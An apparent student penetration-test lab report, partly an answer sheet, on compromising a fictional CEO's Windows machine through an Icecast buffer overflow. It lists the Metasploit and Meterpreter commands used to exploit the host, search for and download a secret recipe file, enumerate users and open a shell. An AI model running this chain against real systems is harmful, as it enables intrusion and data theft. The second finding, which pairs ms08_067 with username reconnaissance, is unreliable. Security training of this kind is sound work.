                                                        GoodSecurity Penetration Test Report 


                                                          Younes@GoodSecurity.com


                                                                9/26/20



High-Level Summary


GoodSecurity was tasked with performing an internal penetration test on GoodCorp’s CEO, Hans Gruber. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Hans’ computer and determine if it is at risk. GoodSecurity’s overall objective was to exploit any vulnerable software and find the secret recipe file on Hans’ computer, while reporting the findings back to GoodCorp.
When performing the internal penetration test, there were several alarming vulnerabilities that were
identified on Hans’ desktop. When performing the attacks, GoodSecurity was able to gain access to his machine and find the secret recipe file by exploit two programs that had major vulnerabilities. The details of the attack can be found in the ‘Findings’ category.


* Findings


Machine IP:
Machine IP: 192.168.0.20
Hostname:
Hostname: MSEDGEWIN10
Vulnerability Exploited:
Icecast HTTP Header Buffer Overflow 
8000/tcp open http Icecast streaming media server
Vulnerability Explanation:
The Icecast application running on 192.168.0.20 allows for a buffer overflow exploit . An attacker can remotely gain control of the victim’s system by overwriting the memory on the system utilizing the Icecast flaw, which writes past the end of a pointer array when receiving 32 HTTP headers. The remote actions that can be exucuted are: File discovery and exfiltration, and Privilege escalation to Administrator.
The system was also found to be vulnerable to the following exploits:
exploit/windows/local/ikeext_service
exploit/windows/local/ms16_075_reflection
Severity:
Critical! 10.0
Proof of Concept:


1. command that performs a service and version scan against the target.
Nmap -sV 192.168.0.20
2. Command that searches for any existing exploits that can be used for any systems with the word “icecast”. We found one exploit.
Searchsploit icecast
3.Now that we know which exploits are available to us, let's start Metasploit: command that starts Metasploit:
Msfconsole
4.The command to search for the Icecast module:
      Answer: search icecast
      The command to use the Icecast module:
Use exploit/windows/http/icecast_header or use 0
5. Set the RHOST to the target machine.
Set RHOST 192.168.0.20
6.Run the command that runs the Icecast exploit
Answer: Run
Run the command that performs a search for the secretfile.txt on the target.
Search -f *secretfile*.txt
7.You should now have a Meterpreter session open.
Run the command to performs a search for the recipe.txt on the target:
Answer: search -f *recipe*.txt
Bonus: Run the command that exfiltrates the recipe*.txt file.
Answer: download 'c:\Users\IEuser\Documents\Drinks.recipe.txt'
Answer: Verify that you have successfully downloaded the file.
8.You can also use Meterpreter's local exploit suggester to find possible exploits.
Run post/multi/recon/local_exploit_suggester
The system was also found to be vulnerable to the following exploits:
exploit/windows/local/ikeext_service
exploit/windows/local/ms16_075_reflection


Bonus:
A. Run a Meterpreter post script that enumerates all logged on users. Command:
 run post/windows/gather/enum_logged_on_users
B. Open a Meterpreter shell and gather system information for the target.


 Answer: shell
C. Run the command that displays the target's computer system information.
Answer: systeminfo
* Findings
Machine IP:
Machine IP: 192.168.0.20
Hostname:        
Hostname: MSEDGEWIN10
Vulnerability Exploited:
Vulnerability Exploited: windows/smb/ms08_067_netapi
Vulnerability Explanation:
Vulnerability Explanation: Reconnaissance of usernames on system.  
Severity: High 7


* Recommendations


The Icecast exploit is an old vulnerability that can be fixed with a patch. Install the latest version of this and all other software. Encrypt all files/folders that you want to keep a secret


Enable your windows firewall with rules to only explicitly allow traffic on needed ports.
